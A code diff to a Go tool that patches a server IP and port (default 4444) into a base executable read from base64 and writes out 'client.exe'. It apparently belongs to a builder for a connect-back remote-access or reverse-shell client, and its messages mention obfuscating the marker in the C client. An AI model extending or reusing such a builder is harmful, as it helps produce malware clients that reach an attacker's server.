@@ -10,12 +10,35 @@ import (
 	"fmt"
 	"io/ioutil"
 	"os"
+	"strconv"
 )
 
 func main() {
-	ip := flag.String("ip", "127.0.0.1", "Server IP address")
-	port := flag.Int("port", 4444, "Server Port")
+	ipFlag := flag.String("ip", "", "Server IP address")
+	portFlag := flag.Int("port", 0, "Server Port")
 	flag.Parse()
+
+	ip := *ipFlag
+	port := *portFlag
+
+	// Support positional arguments if flags are not provided
+	if ip == "" && flag.NArg() >= 1 {
+		ip = flag.Arg(0)
+	}
+	if port == 0 && flag.NArg() >= 2 {
+		p, err := strconv.Atoi(flag.Arg(1))
+		if err == nil {
+			port = p
+		}
+	}
+
+	// Fallbacks
+	if ip == "" {
+		ip = "127.0.0.1"
+	}
+	if port == 0 {
+		port = 4444
+	}
 
 	// Read binary from base64.txt
 	b64Data, err := ioutil.ReadFile("base64.txt")
@@ -32,8 +55,8 @@ func main() {
 
 	// Prepare config
 	config := map[string]interface{}{
-		"ip":   *ip,
-		"port": *port,
+		"ip":   ip,
+		"port": port,
 	}
 	configBytes, _ := json.Marshal(config)
 
@@ -60,11 +83,11 @@ func main() {
 	// Ensure the marker exists exactly once
 	count := bytes.Count(exeData, marker)
 	if count == 0 {
-		fmt.Println("Error: Marker not found in binary")
+		fmt.Println("Error: Marker not found in binary. Ensure the base executable has the correct resource embedded.")
 		os.Exit(1)
 	}
 	if count > 1 {
-		fmt.Printf("Error: Marker found %d times, binary is ambiguous\n", count)
+		fmt.Printf("Error: Marker found %d times, binary is ambiguous. Ensure marker obfuscation is working in the C client.\n", count)
 		os.Exit(1)
 	}
 
@@ -80,5 +103,5 @@ func main() {
 		os.Exit(1)
 	}
 
-	fmt.Println("Build successful: client.exe")
+	fmt.Printf("Build successful: client.exe (IP: %s, Port: %d)\n", ip, port)
 }
